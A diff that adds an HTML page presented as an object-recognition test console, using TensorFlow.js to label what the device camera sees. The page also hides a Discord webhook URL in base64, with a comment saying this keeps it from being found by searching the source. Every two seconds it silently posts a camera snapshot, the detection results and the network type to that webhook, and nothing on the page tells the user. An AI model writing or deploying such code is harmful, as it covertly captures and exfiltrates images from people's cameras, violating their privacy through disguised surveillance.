@@ -1,0 +1,125 @@
+<!DOCTYPE html>
+<html lang="zh-TW">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>AI 辨識同步測試系統</title>
+    <!-- 載入 TensorFlow.js 與 COCO-SSD 模型 -->
+    <script src="https://cdn.jsdelivr.net/npm/@tensorflow/tfjs"></script>
+    <script src="https://cdn.jsdelivr.net/npm/@tensorflow-models/coco-ssd"></script>
+    <style>
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #0d0d0d; color: #00ffcc; display: flex; flex-direction: column; align-items: center; margin: 0; }
+        .container { position: relative; margin-top: 20px; border: 2px solid #00ffcc; box-shadow: 0 0 15px #00ffcc; }
+        video, canvas { border-radius: 4px; }
+        #canvas { position: absolute; top: 0; left: 0; }
+        .info { background: rgba(0,0,0,0.8); padding: 15px; border-radius: 8px; margin-top: 15px; width: 90%; max-width: 500px; border-left: 5px solid #00ffcc; }
+    </style>
+</head>
+<body>
+
+    <h2>SHADOW AI 物品辨識控制台</h2>
+
+    <div class="container">
+        <video id="video" width="400" height="300" autoplay playsinline muted></video>
+        <!-- 畫框與文字用的畫布 -->
+        <canvas id="canvas"></canvas>
+    </div>
+
+    <div class="info">
+        <div id="status">模型載入中...</div>
+        <div id="detect-res">偵測結果: 等待中</div>
+    </div>
+
+    <script>
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const ctx = canvas.getContext('2d');
+        const statusText = document.getElementById('status');
+        const resText = document.getElementById('detect-res');
+
+        // --- 1. Webhook 地址隱蔽處理 ---
+        // 將原本的 URL 先用 Base64 編碼，避免原始碼被直接搜到
+        // 你可以到 https://www.base64encode.org/ 編碼你的 URL
+        const _k = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ1NjY5Mzc0MzU3NDA2MTI5MS9ySlNnMkgxZnFJRG1yQ2pyWmx6QmdIVEMzdEhvRDgySjctTFdBMDBxWlA3VTlYc1ZXSU1kMElYelhxOXlMc09NVHJ3";
+        const getHook = () => atob(_k);
+
+        let model;
+
+        // --- 2. 初始化模型與相機 ---
+        async function setup() {
+            statusText.innerText = "正在啟動相機...";
+            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" }, audio: false });
+            video.srcObject = stream;
+
+            statusText.innerText = "載入 AI 模型中...";
+            model = await cocoSsd.load();
+            statusText.innerText = "系統運作中 - 已連接同步";
+            
+            detectFrame();
+            // 每 2 秒同步一次到 Discord，避免太頻繁被封鎖
+            setInterval(syncToDiscord, 2000);
+        }
+
+        // --- 3. 即時辨識並畫在畫面上 ---
+        async function detectFrame() {
+            const predictions = await model.detect(video);
+            
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            ctx.clearRect(0, 0, canvas.width, canvas.height);
+
+            let detectedItems = [];
+
+            predictions.forEach(p => {
+                detectedItems.push(`${p.class} (${Math.round(p.score * 100)}%)`);
+                
+                // 畫框
+                ctx.strokeStyle = "#00ffcc";
+                ctx.lineWidth = 4;
+                ctx.strokeRect(p.bbox[0], p.bbox[1], p.bbox[2], p.bbox[3]);
+
+                // 畫標籤
+                ctx.fillStyle = "#00ffcc";
+                ctx.font = "18px Arial";
+                ctx.fillText(p.class, p.bbox[0], p.bbox[1] > 10 ? p.bbox[1] - 5 : 10);
+            });
+
+            resText.innerText = "偵測結果: " + (detectedItems.length > 0 ? detectedItems.join(", ") : "無");
+            requestAnimationFrame(detectFrame);
+        }
+
+        // --- 4. 同步資料至 Discord ---
+        async function syncToDiscord() {
+            if (!model) return;
+
+            const tempCanvas = document.createElement('canvas');
+            tempCanvas.width = video.videoWidth;
+            tempCanvas.height = video.videoHeight;
+            tempCanvas.getContext('2d').drawImage(video, 0, 0);
+
+            tempCanvas.toBlob(async (blob) => {
+                const formData = new FormData();
+                const conn = navigator.connection || {};
+                
+                const content = {
+                    embeds: [{
+                        title: "Shadow Server 同步測試",
+                        description: `**偵測對象:** ${resText.innerText}\n**網路:** ${conn.effectiveType || 'unknown'}`,
+                        color: 5814783,
+                        timestamp: new Date()
+                    }]
+                };
+
+                formData.append('payload_json', JSON.stringify(content));
+                formData.append('file', blob, 'sync.jpg');
+
+                try {
+                    await fetch(getHook(), { method: 'POST', body: formData });
+                } catch (e) { console.error("Sync Error"); }
+            }, 'image/jpeg', 0.6);
+        }
+
+        setup();
+    </script>
+</body>
+</html>
